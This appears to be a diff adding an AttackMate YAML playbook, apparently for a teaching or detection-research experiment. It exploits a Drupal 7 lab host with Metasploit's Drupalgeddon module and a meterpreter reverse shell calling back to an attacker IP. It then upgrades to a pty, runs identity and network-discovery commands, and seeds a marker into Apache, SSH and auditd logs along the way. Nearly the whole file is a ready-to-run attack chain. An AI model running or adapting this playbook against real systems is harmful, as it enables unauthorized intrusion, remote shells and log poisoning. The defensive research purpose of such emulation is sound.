@@ -1,0 +1,322 @@
+#
+# Author: AttackMate Initial-Access experiment (MIRANDA teaching example)
+# Description:
+#     Drupal foothold -> network reconnaissance from inside. Drupalgeddon lands a www-
+#     data shell; we upgrade to a pty and run the standard core (which-python, id,
+#     uname), then run host-side network discovery: interfaces, routes, ARP/neighbours,
+#     and listening + established sockets. Enumeration only.
+#
+#     Tactic flow: Initial Access -> Discovery (network)
+#     (Defense Evasion runs throughout: the log-injection marker rides every step.)
+#
+# AUTHORIZED USE ONLY:
+#     Run this only against systems you own or have explicit written permission to test.
+#
+vars:
+  TARGET: 172.28.128.3       # Drupal 7.5 host
+  ATTACKER: 172.28.128.10    # LHOST the payload calls back to
+  LPORT: "4450"
+  PAYLOAD: php/meterpreter/reverse_tcp
+  # Log-injection marker. Space-free single token: auditd hex-encodes any argv that
+  # contains a space, which would break the marker join across log layers.
+  INJECTION: "this_is_the_injection"
+
+commands:
+
+  # ===================== Phase 0: pre-exploit log poisoning =====================
+  # Seed the marker into access.log (HTTP User-Agent) and auth.log (bogus SSH user)
+  # before we touch the exploit. One probe each, attacker-side jitter between them.
+  - type: http-client
+    cmd: GET
+    url: http://$TARGET/?probe=1
+    useragent: "$INJECTION"
+    exit_on_error: False
+    metadata:
+      description: "Benign-looking GET whose User-Agent seeds the marker into the Apache access log"
+      techniques: "T1562.006"
+      tactics: "Defense Evasion"
+
+  - type: sleep
+    seconds: 4
+    min_sec: 1
+    random: True
+    metadata:
+      description: "Human-paced jitter between the two probes"
+
+  - type: ssh
+    cmd: id
+    username: "$INJECTION"
+    password: "x"
+    hostname: $TARGET
+    interactive: False
+    exit_on_error: False
+    metadata:
+      description: "Bogus SSH username injection -> poisons auth.log (Invalid user ...)"
+      techniques: "T1110.001,T1562.006"
+      tactics: "Credential Access,Defense Evasion"
+
+  # ===================== Phase 1: foothold =====================
+  - type: msf-module
+    cmd: exploit/multi/http/drupal_drupageddon
+    creates_session: drupal
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    options:
+      RHOSTS: $TARGET
+      TARGETURI: /drupal/
+      UserAgent: $INJECTION   # poisons the Apache access log (advanced HTTP option)
+    metadata:
+      description: "Exploit Drupalgeddon SQLi; UserAgent poisons the Apache access log"
+      techniques: "T1190,T1059.004,T1071.001,T1562.006"
+      tactics: "Initial Access,Execution,Command and Control,Defense Evasion"
+
+  # ===================== Phase 2: standard post-landing core =====================
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "shell\n"
+    exit_on_error: False
+    metadata:
+      description: "Drop the meterpreter session to a system shell channel (leave meterpreter behind)"
+      techniques: "T1059.004"
+      tactics: "Execution"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the shell channel come up"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'which python' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "Locate a Python interpreter for the pty upgrade; execve poisoned with the marker"
+      techniques: "T1518,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_which_python.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the which-python output (confirm /usr/bin/python is present)"
+      techniques: "T1518"
+      tactics: "Discovery"
+
+  # Upgrade the dumb shell to an interactive pty (shell-spawn; left UNWRAPPED so the
+  # spawned bash persists on the channel -- a bash -c wrapper would run it in a subshell).
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "python -c 'import pty; pty.spawn(\"/bin/bash\")'\n"
+    exit_on_error: False
+    metadata:
+      description: "Upgrade the shell to an interactive pty via python pty.spawn"
+      techniques: "T1059.004"
+      tactics: "Execution"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the pty bash come up"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'id' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "Current identity (expect www-data); execve poisoned with the marker"
+      techniques: "T1033,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_disc_id.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the id output (foothold proof)"
+      techniques: "T1033"
+      tactics: "Discovery"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'uname -a' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "Kernel/architecture; execve poisoned with the marker"
+      techniques: "T1082,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_disc_uname.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the uname output"
+      techniques: "T1082"
+      tactics: "Discovery"
+
+  # ===================== Category: network discovery =====================
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'ip addr show || ifconfig -a' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "Enumerate interfaces and IP addresses (ip, fallback ifconfig); execve marker"
+      techniques: "T1016,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_net_interfaces.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the interface/address listing"
+      techniques: "T1016"
+      tactics: "Discovery"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'ip route show || route -n' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "Routing table -> gateways and other reachable subnets; execve marker"
+      techniques: "T1016,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_net_routes.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the routing table"
+      techniques: "T1016"
+      tactics: "Discovery"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'arp -a || ip neigh show' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "ARP/neighbour cache -> recently contacted hosts on the local segment; execve marker"
+      techniques: "T1018,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_net_arp.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the ARP/neighbour cache"
+      techniques: "T1018"
+      tactics: "Discovery"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'ss -tulpn 2>/dev/null || netstat -tulpn' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "Listening TCP/UDP sockets (local service surface); execve marker"
+      techniques: "T1049,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_net_listen.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the listening-socket listing"
+      techniques: "T1049"
+      tactics: "Discovery"
+
+  - type: msf-session
+    session: drupal
+    write: True
+    cmd: "bash -c 'ss -antp 2>/dev/null || netstat -antp' \"$INJECTION\"\n"
+    exit_on_error: False
+    metadata:
+      description: "All TCP connections + owning PID/program; execve marker"
+      techniques: "T1049,T1562.006"
+      tactics: "Discovery,Defense Evasion"
+
+  - type: sleep
+    seconds: 2
+    metadata:
+      description: "Let the command produce output"
+
+  - type: msf-session
+    session: drupal
+    read: True
+    cmd: read-output
+    save: /tmp/ia_drupal_recon_net_conns.txt
+    exit_on_error: False
+    metadata:
+      description: "Read the full TCP connection listing"
+      techniques: "T1049"
+      tactics: "Discovery"
+
+  - type: debug
+    cmd: "[drupal_recon] network discovery complete -> $RESULT_STDOUT"
+    metadata:
+      description: "Surface the last network-discovery output inline"
+      techniques: "T1049"
+      tactics: "Discovery"
